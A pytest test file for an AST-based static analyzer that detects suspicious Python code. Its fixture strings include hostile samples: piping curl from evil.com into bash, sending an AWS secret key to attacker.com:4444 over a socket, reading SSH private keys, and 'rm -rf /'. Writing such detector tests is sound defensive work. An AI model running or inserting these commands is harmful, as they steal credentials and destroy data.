"""
Unit tests for the AST-based static analyzer.
"""
import pytest
from detectors.ast_analyzer import ASTAnalyzer


@pytest.fixture
def analyzer():
    return ASTAnalyzer()


class TestASTAnalyzer:

    def test_clean_code_is_clean(self, analyzer):
        code = """
def add(a, b):
    return a + b

class Calc:
    def mul(self, x, y):
        return x * y
"""
        r = analyzer.analyze_source(code, "clean.py")
        assert len(r.findings) == 0
        assert r.signal_value == 0.0
        assert not r.has_suspicious_code

    def test_eval_detected(self, analyzer):
        r = analyzer.analyze_source("eval('__import__(\"os\").system(\"id\")')", "evil.py")
        cats = [f.category for f in r.findings]
        assert "exec" in cats
        assert r.signal_value >= 0.8

    def test_exec_detected(self, analyzer):
        r = analyzer.analyze_source("exec(compile(code, '<string>', 'exec'))", "evil.py")
        cats = [f.category for f in r.findings]
        assert "exec" in cats

    def test_subprocess_detected(self, analyzer):
        code = "import subprocess\nsubprocess.run(['rm','-rf','/'], shell=True)"
        r = analyzer.analyze_source(code, "evil.py")
        cats = [f.category for f in r.findings]
        assert "exec" in cats

    def test_os_system_detected(self, analyzer):
        code = "import os\nos.system('curl https://evil.com | bash')"
        r = analyzer.analyze_source(code, "evil.py")
        cats = [f.category for f in r.findings]
        assert "exec" in cats

    def test_env_access_detected(self, analyzer):
        code = "import os\ntoken = os.environ.get('AWS_SECRET_ACCESS_KEY')"
        r = analyzer.analyze_source(code, "evil.py")
        cats = [f.category for f in r.findings]
        assert "credential" in cats

    def test_ssh_file_read_detected(self, analyzer):
        code = "f = open('/home/user/.ssh/id_rsa')\ndata = f.read()"
        r = analyzer.analyze_source(code, "evil.py")
        cats = [f.category for f in r.findings]
        assert "credential" in cats

    def test_base64_decode_detected(self, analyzer):
        code = "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))"
        r = analyzer.analyze_source(code, "evil.py")
        cats = [f.category for f in r.findings]
        assert "obfuscation" in cats or "exec" in cats

    def test_network_call_detected(self, analyzer):
        code = "import socket\ns = socket.socket()\ns.connect(('evil.com', 4444))"
        r = analyzer.analyze_source(code, "evil.py")
        cats = [f.category for f in r.findings]
        assert "network" in cats

    def test_combined_exfiltration_pattern(self, analyzer):
        code = """
import os, socket, base64
token = os.environ.get('AWS_SECRET_ACCESS_KEY')
s = socket.socket()
s.connect(('attacker.com', 4444))
s.send(base64.b64encode(token.encode()))
"""
        r = analyzer.analyze_source(code, "exfil.py")
        assert r.has_suspicious_code
        assert r.signal_value >= 0.8
        cats = {f.category for f in r.findings}
        assert len(cats) >= 2

    def test_syntax_error_returns_gracefully(self, analyzer):
        r = analyzer.analyze_source("def broken(:\n    pass", "broken.py")
        assert r.parse_error is not None
        assert len(r.findings) == 0

    def test_multiple_files(self, analyzer):
        files = {
            "setup.py":  "import os\nos.system('ls')",
            "helpers.py": "def add(a,b): return a+b",
        }
        r = analyzer.analyze_files(files)
        assert any(f.category == "exec" for f in r.findings)

    def test_import_alias_resolved(self, analyzer):
        code = "import os as operating_system\noperating_system.system('id')"
        r = analyzer.analyze_source(code, "alias.py")
        cats = [f.category for f in r.findings]
        assert "exec" in cats

    def test_signal_scales_with_severity(self, analyzer):
        low_code  = "import requests"
        high_code = "import os\nos.system('rm -rf /')\nimport subprocess\nsubprocess.call(['id'])"
        r_low  = analyzer.analyze_source(low_code,  "low.py")
        r_high = analyzer.analyze_source(high_code, "high.py")
        assert r_high.signal_value > r_low.signal_value